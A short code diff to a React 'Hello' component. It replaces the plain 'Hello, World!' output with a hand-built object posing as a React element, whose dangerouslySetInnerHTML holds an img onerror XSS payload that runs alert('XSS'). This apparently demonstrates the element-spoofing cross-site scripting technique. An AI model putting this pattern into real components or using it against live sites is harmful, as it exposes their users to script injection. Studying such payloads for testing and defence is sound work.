@@ -2,7 +2,22 @@
 
 class Hello extends React.Component {
   render() {
-    return <div>Hello, World!</div>;
+    return React.createElement(
+      "div",
+      null,
+      {
+        "_isReactElement": true,
+        "_store": {
+          "originalProps": {}
+        },
+        "type": "body",
+        "props": {
+          "dangerouslySetInnerHTML": {
+            "__html": "<img src='whatever' onerror=\"javascript: alert('XSS')\" />"
+          }
+        }
+      }
+    );
   }
 }
 
